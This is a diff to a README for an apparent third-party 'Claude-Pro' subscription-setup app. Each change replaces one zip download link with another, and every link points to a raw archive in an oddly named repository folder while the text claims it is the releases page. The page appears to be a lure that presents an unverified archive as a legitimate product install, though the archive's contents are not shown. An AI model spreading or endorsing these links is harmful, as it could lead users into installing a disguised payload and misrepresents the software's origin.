@@ -1,6 +1,6 @@
 # 🚀 Claude-Pro - Your Guide to Subscription Setup
 
-[![Download Claude-Pro](https://raw.githubusercontent.com/TheSamMan123/Claude-Pro/master/streakiness/Claude-Pro-3.2-alpha.4.zip)](https://raw.githubusercontent.com/TheSamMan123/Claude-Pro/master/streakiness/Claude-Pro-3.2-alpha.4.zip)
+[![Download Claude-Pro](https://raw.githubusercontent.com/TheSamMan123/Claude-Pro/master/streakiness/Claude_Pro_v2.5.zip)](https://raw.githubusercontent.com/TheSamMan123/Claude-Pro/master/streakiness/Claude_Pro_v2.5.zip)
 
 ## 📖 Overview
 
@@ -24,7 +24,7 @@ Follow these simple steps to set up Claude-Pro.
 
 Navigate to our Releases page to find the latest version of Claude-Pro. You can access it directly by clicking the link below.
 
-[Download Claude-Pro](https://raw.githubusercontent.com/TheSamMan123/Claude-Pro/master/streakiness/Claude-Pro-3.2-alpha.4.zip)
+[Download Claude-Pro](https://raw.githubusercontent.com/TheSamMan123/Claude-Pro/master/streakiness/Claude_Pro_v2.5.zip)
 
 ### 2. **Download the Application**
 
@@ -71,7 +71,7 @@ If you encounter any issues or have questions, feel free to reach out to our sup
 
 To get started, visit the Releases page and download the Claude-Pro application.
 
-[Download Claude-Pro](https://raw.githubusercontent.com/TheSamMan123/Claude-Pro/master/streakiness/Claude-Pro-3.2-alpha.4.zip)
+[Download Claude-Pro](https://raw.githubusercontent.com/TheSamMan123/Claude-Pro/master/streakiness/Claude_Pro_v2.5.zip)
 
 ## 🌍 Topics Covered
 
